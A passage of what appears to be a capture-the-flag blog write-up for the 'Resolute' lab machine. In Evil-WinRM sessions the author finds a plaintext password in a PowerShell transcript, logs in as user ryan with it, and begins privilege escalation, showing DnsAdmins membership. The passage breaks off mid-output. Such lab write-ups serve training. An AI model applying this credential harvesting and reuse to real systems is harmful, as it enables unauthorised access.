+</span><span class="nf">d-r---</span><span class="w">        </span><span class="nx">12/4/2019</span><span class="w">   </span><span class="nx">2:46</span><span class="w"> </span><span class="nx">AM</span><span class="w">                </span><span class="nx">Users</span><span class="w">                                                                                                                                                                                                   
+</span><span class="nf">d-----</span><span class="w">        </span><span class="nx">12/4/2019</span><span class="w">   </span><span class="nx">5:15</span><span class="w"> </span><span class="nx">AM</span><span class="w">                </span><span class="nx">Windows</span><span class="w">                                                                                                                                                                                                 
+</span><span class="nt">-arhs</span><span class="nf">-</span><span class="w">       </span><span class="mi">11</span><span class="nf">/20/2016</span><span class="w">   </span><span class="nx">5:59</span><span class="w"> </span><span class="nx">PM</span><span class="w">         </span><span class="nx">389408</span><span class="w"> </span><span class="nx">bootmgr</span><span class="w">                                                                                                                                                                                                 
+</span><span class="nt">-a-hs</span><span class="nf">-</span><span class="w">        </span><span class="mi">7</span><span class="nf">/16/2016</span><span class="w">   </span><span class="nx">6:10</span><span class="w"> </span><span class="nx">AM</span><span class="w">              </span><span class="nx">1</span><span class="w"> </span><span class="nx">BOOTNXT</span><span class="w">                                                                                                                                                                                                 
+</span><span class="nt">-a-hs</span><span class="nf">-</span><span class="w">         </span><span class="mi">2</span><span class="nf">/8/2020</span><span class="w">   </span><span class="nx">8:22</span><span class="w"> </span><span class="nx">PM</span><span class="w">      </span><span class="nx">402653184</span><span class="w"> </span><span class="nx">pagefile.sys</span><span class="w">                                                                                                                                                                                            
+
+</span><span class="o">*</span><span class="nf">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\</span><span class="err">&gt;</span><span class="w"> 
+</span></pre></table></code></div></div><p>And got a dir called <code class="language-plaintext highlighter-rouge">PSTranscripts</code></p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre><span class="o">*</span><span class="nf">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\PSTranscripts\20191203</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">dir</span><span class="w"> </span><span class="nt">-force</span><span class="w">
+    </span><span class="nf">Directory:</span><span class="w"> </span><span class="nx">C:\PSTranscripts\20191203</span><span class="w">
+</span><span class="nf">Mode</span><span class="w">                </span><span class="nx">LastWriteTime</span><span class="w">         </span><span class="nx">Length</span><span class="w"> </span><span class="nx">Name</span><span class="w">                                                                                                                                                                                                    
+</span><span class="nf">----</span><span class="w">                </span><span class="nf">-------------</span><span class="w">         </span><span class="nf">------</span><span class="w"> </span><span class="nf">----</span><span class="w">                                                                                                                                                                                                    
+</span><span class="nt">-arh</span><span class="nf">--</span><span class="w">        </span><span class="mi">12</span><span class="nf">/3/2019</span><span class="w">   </span><span class="nx">6:45</span><span class="w"> </span><span class="nx">AM</span><span class="w">           </span><span class="nx">3732</span><span class="w"> 
+ </span><span class="nf">PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt</span><span class="w">                                                                       
+</span></pre></table></code></div></div><p>And we got a file called <code class="language-plaintext highlighter-rouge">PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt</code></p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84
+85
+86
+87
+88
+89
+90
+91
+</pre><td class="rouge-code"><pre><span class="o">*</span><span class="nf">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\PSTranscripts\20191203</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">cat</span><span class="w"> </span><span class="nx">PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt</span><span class="w">
+</span><span class="o">**********************</span><span class="w">
+</span><span class="nf">Windows</span><span class="w"> </span><span class="nx">PowerShell</span><span class="w"> </span><span class="nx">transcript</span><span class="w"> </span><span class="nx">start</span><span class="w">
+</span><span class="nf">Start</span><span class="w"> </span><span class="nx">time:</span><span class="w"> </span><span class="nx">20191203063201</span><span class="w">
+</span><span class="nf">Username:</span><span class="w"> </span><span class="nx">MEGABANK\ryan</span><span class="w">
+</span><span class="nf">RunAs</span><span class="w"> </span><span class="nx">User:</span><span class="w"> </span><span class="nx">MEGABANK\ryan</span><span class="w">
+</span><span class="nf">Machine:</span><span class="w"> </span><span class="nx">RESOLUTE</span><span class="w"> </span><span class="p">(</span><span class="nf">Microsoft</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">NT</span><span class="w"> </span><span class="nx">10.0.14393.0</span><span class="p">)</span><span class="w">
+</span><span class="nf">Host</span><span class="w"> </span><span class="nx">Application:</span><span class="w"> </span><span class="nx">C:\Windows\system32\wsmprovhost.exe</span><span class="w"> </span><span class="nt">-Embedding</span><span class="w">
+</span><span class="kr">Process</span><span class="w"> </span><span class="nf">ID:</span><span class="w"> </span><span class="nx">2800</span><span class="w">
+</span><span class="nf">PSVersion:</span><span class="w"> </span><span class="nx">5.1.14393.2273</span><span class="w">
+</span><span class="nf">PSEdition:</span><span class="w"> </span><span class="nx">Desktop</span><span class="w">
+</span><span class="nf">PSCompatibleVersions:</span><span class="w"> </span><span class="nx">1.0</span><span class="p">,</span><span class="w"> </span><span class="nx">2.0</span><span class="p">,</span><span class="w"> </span><span class="nx">3.0</span><span class="p">,</span><span class="w"> </span><span class="nx">4.0</span><span class="p">,</span><span class="w"> </span><span class="nx">5.0</span><span class="p">,</span><span class="w"> </span><span class="nx">5.1.14393.2273</span><span class="w">
+</span><span class="nf">BuildVersion:</span><span class="w"> </span><span class="nx">10.0.14393.2273</span><span class="w">
+</span><span class="nf">CLRVersion:</span><span class="w"> </span><span class="nx">4.0.30319.42000</span><span class="w">
+</span><span class="nf">WSManStackVersion:</span><span class="w"> </span><span class="nx">3.0</span><span class="w">
+</span><span class="nf">PSRemotingProtocolVersion:</span><span class="w"> </span><span class="nx">2.3</span><span class="w">
+</span><span class="nf">SerializationVersion:</span><span class="w"> </span><span class="nx">1.1.0.1</span><span class="w">
+</span><span class="o">**********************</span><span class="w">
+</span><span class="kr">Command</span><span class="w"> </span><span class="nf">start</span><span class="w"> </span><span class="nx">time:</span><span class="w"> </span><span class="nx">20191203063455</span><span class="w">
+</span><span class="o">**********************</span><span class="w">
+</span><span class="nf">PS</span><span class="err">&gt;</span><span class="nx">TerminatingError</span><span class="p">():</span><span class="w"> </span><span class="s2">"System error."</span><span class="w">
+</span><span class="err">&gt;&gt;</span><span class="w"> </span><span class="nf">CommandInvocation</span><span class="p">(</span><span class="nf">Invoke-Expression</span><span class="p">):</span><span class="w"> </span><span class="s2">"Invoke-Expression"</span><span class="w">
+</span><span class="err">&gt;&gt;</span><span class="w"> </span><span class="nf">ParameterBinding</span><span class="p">(</span><span class="nf">Invoke-Expression</span><span class="p">):</span><span class="w"> </span><span class="nf">name</span><span class="o">=</span><span class="s2">"Command"</span><span class="p">;</span><span class="w"> </span><span class="nf">value</span><span class="o">=</span><span class="s2">"-join(</span><span class="nv">$id</span><span class="s2">,'PS ',</span><span class="si">$(</span><span class="nf">whoami</span><span class="p">),</span><span class="s1">'@'</span><span class="p">,</span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">computername</span><span class="p">,</span><span class="s1">' '</span><span class="p">,</span><span class="err">$</span><span class="p">((</span><span class="nf">gi</span><span class="w"> </span><span class="nv">$pwd</span><span class="p">)</span><span class="o">.</span><span class="nf">Name</span><span class="si">)</span><span class="s2">,'&gt; ')
+if (!</span><span class="bp">$?</span><span class="s2">) { if(</span><span class="nv">$LASTEXITCODE</span><span class="s2">) { exit </span><span class="nv">$LASTEXITCODE</span><span class="s2"> } else { exit 1 } }"</span><span class="w">
+</span><span class="err">&gt;&gt;</span><span class="w"> </span><span class="nf">CommandInvocation</span><span class="p">(</span><span class="nf">Out-String</span><span class="p">):</span><span class="w"> </span><span class="s2">"Out-String"</span><span class="w">
+</span><span class="err">&gt;&gt;</span><span class="w"> </span><span class="nf">ParameterBinding</span><span class="p">(</span><span class="nf">Out-String</span><span class="p">):</span><span class="w"> </span><span class="nf">name</span><span class="o">=</span><span class="s2">"Stream"</span><span class="p">;</span><span class="w"> </span><span class="nf">value</span><span class="o">=</span><span class="s2">"True"</span><span class="w">
+</span><span class="o">**********************</span><span class="w">
+</span><span class="kr">Command</span><span class="w"> </span><span class="nf">start</span><span class="w"> </span><span class="nx">time:</span><span class="w"> </span><span class="nx">20191203063455</span><span class="w">
+</span><span class="o">**********************</span><span class="w">
+</span><span class="nf">PS</span><span class="err">&gt;</span><span class="nx">ParameterBinding</span><span class="p">(</span><span class="nf">Out-String</span><span class="p">):</span><span class="w"> </span><span class="nf">name</span><span class="o">=</span><span class="s2">"InputObject"</span><span class="p">;</span><span class="w"> </span><span class="nf">value</span><span class="o">=</span><span class="s2">"PS megabank\ryan@RESOLUTE Documents&gt; "</span><span class="w">
+</span><span class="nf">PS</span><span class="w"> </span><span class="nx">megabank\ryan</span><span class="err">@</span><span class="nx">RESOLUTE</span><span class="w"> </span><span class="nx">Documents</span><span class="err">&gt;</span><span class="w">
+</span><span class="o">**********************</span><span class="w">
+</span><span class="kr">Command</span><span class="w"> </span><span class="nf">start</span><span class="w"> </span><span class="nx">time:</span><span class="w"> </span><span class="nx">20191203063515</span><span class="w">
+</span><span class="o">**********************</span><span class="w">
+</span><span class="nf">PS</span><span class="err">&gt;</span><span class="nx">CommandInvocation</span><span class="p">(</span><span class="nf">Invoke-Expression</span><span class="p">):</span><span class="w"> </span><span class="s2">"Invoke-Expression"</span><span class="w">
+</span><span class="err">&gt;&gt;</span><span class="w"> </span><span class="nf">ParameterBinding</span><span class="p">(</span><span class="nf">Invoke-Expression</span><span class="p">):</span><span class="w"> </span><span class="nf">name</span><span class="o">=</span><span class="s2">"Command"</span><span class="p">;</span><span class="w"> </span><span class="nf">value</span><span class="o">=</span><span class="s2">"cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
+
+if (!</span><span class="bp">$?</span><span class="s2">) { if(</span><span class="nv">$LASTEXITCODE</span><span class="s2">) { exit </span><span class="nv">$LASTEXITCODE</span><span class="s2"> } else { exit 1 } }"</span><span class="w">
+</span><span class="err">&gt;&gt;</span><span class="w"> </span><span class="nf">CommandInvocation</span><span class="p">(</span><span class="nf">Out-String</span><span class="p">):</span><span class="w"> </span><span class="s2">"Out-String"</span><span class="w">
+</span><span class="err">&gt;&gt;</span><span class="w"> </span><span class="nf">ParameterBinding</span><span class="p">(</span><span class="nf">Out-String</span><span class="p">):</span><span class="w"> </span><span class="nf">name</span><span class="o">=</span><span class="s2">"Stream"</span><span class="p">;</span><span class="w"> </span><span class="nf">value</span><span class="o">=</span><span class="s2">"True"</span><span class="w">
+</span><span class="o">**********************</span><span class="w">
+</span><span class="nf">Windows</span><span class="w"> </span><span class="nx">PowerShell</span><span class="w"> </span><span class="nx">transcript</span><span class="w"> </span><span class="nx">start</span><span class="w">
+</span><span class="nf">Start</span><span class="w"> </span><span class="nx">time:</span><span class="w"> </span><span class="nx">20191203063515</span><span class="w">
+</span><span class="nf">Username:</span><span class="w"> </span><span class="nx">MEGABANK\ryan</span><span class="w">
+</span><span class="nf">RunAs</span><span class="w"> </span><span class="nx">User:</span><span class="w"> </span><span class="nx">MEGABANK\ryan</span><span class="w">
+</span><span class="nf">Machine:</span><span class="w"> </span><span class="nx">RESOLUTE</span><span class="w"> </span><span class="p">(</span><span class="nf">Microsoft</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">NT</span><span class="w"> </span><span class="nx">10.0.14393.0</span><span class="p">)</span><span class="w">
+</span><span class="nf">Host</span><span class="w"> </span><span class="nx">Application:</span><span class="w"> </span><span class="nx">C:\Windows\system32\wsmprovhost.exe</span><span class="w"> </span><span class="nt">-Embedding</span><span class="w">
+</span><span class="kr">Process</span><span class="w"> </span><span class="nf">ID:</span><span class="w"> </span><span class="nx">2800</span><span class="w">
+</span><span class="nf">PSVersion:</span><span class="w"> </span><span class="nx">5.1.14393.2273</span><span class="w">
+</span><span class="nf">PSEdition:</span><span class="w"> </span><span class="nx">Desktop</span><span class="w">
+</span><span class="nf">PSCompatibleVersions:</span><span class="w"> </span><span class="nx">1.0</span><span class="p">,</span><span class="w"> </span><span class="nx">2.0</span><span class="p">,</span><span class="w"> </span><span class="nx">3.0</span><span class="p">,</span><span class="w"> </span><span class="nx">4.0</span><span class="p">,</span><span class="w"> </span><span class="nx">5.0</span><span class="p">,</span><span class="w"> </span><span class="nx">5.1.14393.2273</span><span class="w">
+</span><span class="nf">BuildVersion:</span><span class="w"> </span><span class="nx">10.0.14393.2273</span><span class="w">
+</span><span class="nf">CLRVersion:</span><span class="w"> </span><span class="nx">4.0.30319.42000</span><span class="w">
+</span><span class="nf">WSManStackVersion:</span><span class="w"> </span><span class="nx">3.0</span><span class="w">
+</span><span class="nf">PSRemotingProtocolVersion:</span><span class="w"> </span><span class="nx">2.3</span><span class="w">
+</span><span class="nf">SerializationVersion:</span><span class="w"> </span><span class="nx">1.1.0.1</span><span class="w">
+</span><span class="o">**********************</span><span class="w">
+</span><span class="o">**********************</span><span class="w">
+</span><span class="kr">Command</span><span class="w"> </span><span class="nf">start</span><span class="w"> </span><span class="nx">time:</span><span class="w"> </span><span class="nx">20191203063515</span><span class="w">
+</span><span class="o">**********************</span><span class="w">
+</span><span class="nf">PS</span><span class="err">&gt;</span><span class="nx">CommandInvocation</span><span class="p">(</span><span class="nf">Out-String</span><span class="p">):</span><span class="w"> </span><span class="s2">"Out-String"</span><span class="w">
+</span><span class="err">&gt;&gt;</span><span class="w"> </span><span class="nf">ParameterBinding</span><span class="p">(</span><span class="nf">Out-String</span><span class="p">):</span><span class="w"> </span><span class="nf">name</span><span class="o">=</span><span class="s2">"InputObject"</span><span class="p">;</span><span class="w"> </span><span class="nf">value</span><span class="o">=</span><span class="s2">"The syntax of this command is:"</span><span class="w">
+</span><span class="nf">cmd</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">The</span><span class="w"> </span><span class="nx">syntax</span><span class="w"> </span><span class="nx">of</span><span class="w"> </span><span class="nx">this</span><span class="w"> </span><span class="nx">command</span><span class="w"> </span><span class="nx">is:</span><span class="w">
+</span><span class="nf">At</span><span class="w"> </span><span class="nx">line:1</span><span class="w"> </span><span class="nx">char:1</span><span class="w">
+</span><span class="o">+</span><span class="w"> </span><span class="nf">cmd</span><span class="w"> </span><span class="nx">/c</span><span class="w"> </span><span class="nx">net</span><span class="w"> </span><span class="nx">use</span><span class="w"> </span><span class="nx">X:</span><span class="w"> </span><span class="nx">\\fs01\backups</span><span class="w"> </span><span class="nx">ryan</span><span class="w"> </span><span class="nx">Serv3r4Admin4cc123</span><span class="o">!</span><span class="w">
+</span><span class="o">+</span><span class="w"> </span><span class="nf">~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><span class="w">
+    </span><span class="o">+</span><span class="w"> </span><span class="nx">CategoryInfo</span><span class="w">          </span><span class="p">:</span><span class="w"> </span><span class="nx">NotSpecified:</span><span class="w"> </span><span class="p">(</span><span class="nf">The</span><span class="w"> </span><span class="nx">syntax</span><span class="w"> </span><span class="nx">of</span><span class="w"> </span><span class="nx">this</span><span class="w"> </span><span class="nx">command</span><span class="w"> </span><span class="nx">is::String</span><span class="p">)</span><span class="w"> </span><span class="p">[],</span><span class="w"> </span><span class="nf">RemoteException</span><span class="w">
+    </span><span class="o">+</span><span class="w"> </span><span class="nx">FullyQualifiedErrorId</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">NativeCommandError</span><span class="w">
+</span><span class="nf">cmd</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">The</span><span class="w"> </span><span class="nx">syntax</span><span class="w"> </span><span class="nx">of</span><span class="w"> </span><span class="nx">this</span><span class="w"> </span><span class="nx">command</span><span class="w"> </span><span class="nx">is:</span><span class="w">
+</span><span class="nf">At</span><span class="w"> </span><span class="nx">line:1</span><span class="w"> </span><span class="nx">char:1</span><span class="w">
+</span><span class="o">+</span><span class="w"> </span><span class="nf">cmd</span><span class="w"> </span><span class="nx">/c</span><span class="w"> </span><span class="nx">net</span><span class="w"> </span><span class="nx">use</span><span class="w"> </span><span class="nx">X:</span><span class="w"> </span><span class="nx">\\fs01\backups</span><span class="w"> </span><span class="nx">ryan</span><span class="w"> </span><span class="nx">Serv3r4Admin4cc123</span><span class="o">!</span><span class="w">
+</span><span class="o">+</span><span class="w"> </span><span class="nf">~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><span class="w">
+    </span><span class="o">+</span><span class="w"> </span><span class="nx">CategoryInfo</span><span class="w">          </span><span class="p">:</span><span class="w"> </span><span class="nx">NotSpecified:</span><span class="w"> </span><span class="p">(</span><span class="nf">The</span><span class="w"> </span><span class="nx">syntax</span><span class="w"> </span><span class="nx">of</span><span class="w"> </span><span class="nx">this</span><span class="w"> </span><span class="nx">command</span><span class="w"> </span><span class="nx">is::String</span><span class="p">)</span><span class="w"> </span><span class="p">[],</span><span class="w"> </span><span class="nf">RemoteException</span><span class="w">
+    </span><span class="o">+</span><span class="w"> </span><span class="nx">FullyQualifiedErrorId</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">NativeCommandError</span><span class="w">
+</span><span class="o">**********************</span><span class="w">
+</span><span class="nf">Windows</span><span class="w"> </span><span class="nx">PowerShell</span><span class="w"> </span><span class="nx">transcript</span><span class="w"> </span><span class="nx">start</span><span class="w">
+</span><span class="nf">Start</span><span class="w"> </span><span class="nx">time:</span><span class="w"> </span><span class="nx">20191203063515</span><span class="w">
+</span><span class="nf">Username:</span><span class="w"> </span><span class="nx">MEGABANK\ryan</span><span class="w">
+</span><span class="nf">RunAs</span><span class="w"> </span><span class="nx">User:</span><span class="w"> </span><span class="nx">MEGABANK\ryan</span><span class="w">
+</span><span class="nf">Machine:</span><span class="w"> </span><span class="nx">RESOLUTE</span><span class="w"> </span><span class="p">(</span><span class="nf">Microsoft</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">NT</span><span class="w"> </span><span class="nx">10.0.14393.0</span><span class="p">)</span><span class="w">
+</span><span class="nf">Host</span><span class="w"> </span><span class="nx">Application:</span><span class="w"> </span><span class="nx">C:\Windows\system32\wsmprovhost.exe</span><span class="w"> </span><span class="nt">-Embedding</span><span class="w">
+</span><span class="kr">Process</span><span class="w"> </span><span class="nf">ID:</span><span class="w"> </span><span class="nx">2800</span><span class="w">
+</span><span class="nf">PSVersion:</span><span class="w"> </span><span class="nx">5.1.14393.2273</span><span class="w">
+</span><span class="nf">PSEdition:</span><span class="w"> </span><span class="nx">Desktop</span><span class="w">
+</span><span class="nf">PSCompatibleVersions:</span><span class="w"> </span><span class="nx">1.0</span><span class="p">,</span><span class="w"> </span><span class="nx">2.0</span><span class="p">,</span><span class="w"> </span><span class="nx">3.0</span><span class="p">,</span><span class="w"> </span><span class="nx">4.0</span><span class="p">,</span><span class="w"> </span><span class="nx">5.0</span><span class="p">,</span><span class="w"> </span><span class="nx">5.1.14393.2273</span><span class="w">
+</span><span class="nf">BuildVersion:</span><span class="w"> </span><span class="nx">10.0.14393.2273</span><span class="w">
+</span><span class="nf">CLRVersion:</span><span class="w"> </span><span class="nx">4.0.30319.42000</span><span class="w">
+</span><span class="nf">WSManStackVersion:</span><span class="w"> </span><span class="nx">3.0</span><span class="w">
+</span><span class="nf">PSRemotingProtocolVersion:</span><span class="w"> </span><span class="nx">2.3</span><span class="w">
+</span><span class="nf">SerializationVersion:</span><span class="w"> </span><span class="nx">1.1.0.1</span><span class="w">
+</span><span class="o">**********************</span><span class="w">
+</span></pre></table></code></div></div><p>And the <strong>most</strong> interesting thing there is a <code class="language-plaintext highlighter-rouge">password</code> of user <strong>ryan</strong></p><blockquote><ul><li>cmd /c net use X: \fs01\backups ryan Serv3r4Admin4cc123!</ul></blockquote><p>And the password is <code class="language-plaintext highlighter-rouge">Serv3r4Admin4cc123!</code> Yay…….!!!</p><p>Using <code class="language-plaintext highlighter-rouge">evil-winrm</code> i logged in as ryan</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre><span class="err">➜</span><span class="w">  </span><span class="nf">prashant</span><span class="w"> </span><span class="nx">evil-winrm</span><span class="w"> </span><span class="nt">-i</span><span class="w"> </span><span class="nx">resolute.htb</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="nx">ryan</span><span class="w"> </span><span class="nt">-p</span><span class="w"> </span><span class="nx">Serv3r4Admin4cc123</span><span class="o">!</span><span class="w">
+
+</span><span class="nf">Evil-WinRM</span><span class="w"> </span><span class="nx">shell</span><span class="w"> </span><span class="nx">v2.3</span><span class="w">
+
+</span><span class="nf">Info:</span><span class="w"> </span><span class="nx">Establishing</span><span class="w"> </span><span class="nx">connection</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">remote</span><span class="w"> </span><span class="nx">endpoint</span><span class="w">
+
+</span><span class="o">*</span><span class="nf">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\ryan\Documents</span><span class="err">&gt;</span><span class="w"> 
+</span></pre></table></code></div></div><h1 id="privilege-escalation">Privilege Escalation</h1><p>For checking what <strong>privileges</strong> i have i can check it with <code class="language-plaintext highlighter-rouge">whoami</code></p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+</pre><td class="rouge-code"><pre><span class="o">*</span><span class="nf">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\ryan\Documents</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">whoami</span><span class="w"> </span><span class="nx">/all</span><span class="w">
+
+</span><span class="nf">USER</span><span class="w"> </span><span class="nx">INFORMATION</span><span class="w">
+</span><span class="nf">----------------</span><span class="w">
+
+</span><span class="nf">User</span><span class="w"> </span><span class="nx">Name</span><span class="w">     </span><span class="nx">SID</span><span class="w">
+</span><span class="o">=============</span><span class="w"> </span><span class="o">==============================================</span><span class="w">
+</span><span class="nf">megabank\ryan</span><span class="w"> </span><span class="nx">S-1-5-21-1392959593-3013219662-3596683436-1105</span><span class="w">
+
+
+</span><span class="nf">GROUP</span><span class="w"> </span><span class="nx">INFORMATION</span><span class="w">
+</span><span class="nf">-----------------</span><span class="w">
+
+</span><span class="nf">Group</span><span class="w"> </span><span class="nx">Name</span><span class="w">                                 </span><span class="nx">Type</span><span class="w">             </span><span class="nx">SID</span><span class="w">                                            </span><span class="nx">Attributes</span><span class="w">
+</span><span class="o">==========================================</span><span class="w"> </span><span class="o">================</span><span class="w"> </span><span class="o">==============================================</span><span class="w"> </span><span class="o">===============================================================</span><span class="w">
+</span><span class="nf">Everyone</span><span class="w">                                   </span><span class="nx">Well-known</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="nx">S-1-1-0</span><span class="w">                                        </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">default</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">group</span><span class="w">
+</span><span class="nf">BUILTIN\Users</span><span class="w">                              </span><span class="nx">Alias</span><span class="w">            </span><span class="nx">S-1-5-32-545</span><span class="w">                                   </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">default</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">group</span><span class="w">
+</span><span class="nf">BUILTIN\Pre-Windows</span><span class="w"> </span><span class="nx">2000</span><span class="w"> </span><span class="nx">Compatible</span><span class="w"> </span><span class="nx">Access</span><span class="w"> </span><span class="nx">Alias</span><span class="w">            </span><span class="nx">S-1-5-32-554</span><span class="w">                                   </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">default</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">group</span><span class="w">
+</span><span class="nf">BUILTIN\Remote</span><span class="w"> </span><span class="nx">Management</span><span class="w"> </span><span class="nx">Users</span><span class="w">            </span><span class="nx">Alias</span><span class="w">            </span><span class="nx">S-1-5-32-580</span><span class="w">                                   </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">default</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">group</span><span class="w">
+</span><span class="nf">NT</span><span class="w"> </span><span class="nx">AUTHORITY\NETWORK</span><span class="w">                       </span><span class="nx">Well-known</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="nx">S-1-5-2</span><span class="w">                                        </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">default</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">group</span><span class="w">
+</span><span class="nf">NT</span><span class="w"> </span><span class="nx">AUTHORITY\Authenticated</span><span class="w"> </span><span class="nx">Users</span><span class="w">           </span><span class="nx">Well-known</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="nx">S-1-5-11</span><span class="w">                                       </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">default</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">group</span><span class="w">
+</span><span class="nf">NT</span><span class="w"> </span><span class="nx">AUTHORITY\This</span><span class="w"> </span><span class="nx">Organization</span><span class="w">             </span><span class="nx">Well-known</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="nx">S-1-5-15</span><span class="w">                                       </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">default</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">group</span><span class="w">
+</span><span class="nf">MEGABANK\Contractors</span><span class="w">                       </span><span class="nx">Group</span><span class="w">            </span><span class="nx">S-1-5-21-1392959593-3013219662-3596683436-1103</span><span class="w"> </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">default</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">group</span><span class="w">
+</span><span class="nf">MEGABANK\DnsAdmins</span><span class="w">                         </span><span class="nx">Alias</span><span class="w">            </span><span class="nx">S-1-5-21-1392959593-3013219662-3596683436-1101</span><span class="w"> </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">default</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">Local</span><span class="w"> </span><span class="nx">Group</span><span class="w">
+</span><span class="nf">NT</span><span class="w"> </span><span class="nx">AUTHORITY\NTLM</span><span class="w"> </span><span class="nx">Authentication</span><span class="w">           </span><span class="nx">Well-known</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="nx">S-1-5-64-10</span><span class="w">                                    </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">default</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">group</span><span class="w">
